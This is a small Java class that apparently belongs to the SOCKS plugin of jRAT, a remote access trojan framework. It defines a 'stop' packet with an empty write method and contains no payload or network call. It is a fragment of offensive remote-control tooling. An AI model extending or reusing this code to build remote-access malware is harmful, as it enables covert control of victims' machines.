package se.jrat.plugin.socks.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import se.jrat.plugins.socks.Global;
import jrat.api.PacketBuilder;
import jrat.api.Client;

public class Packet119Stop extends PacketBuilder {

	public Packet119Stop(Client rat) {
		super(Global.HEADER_STOP, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {

	}

}
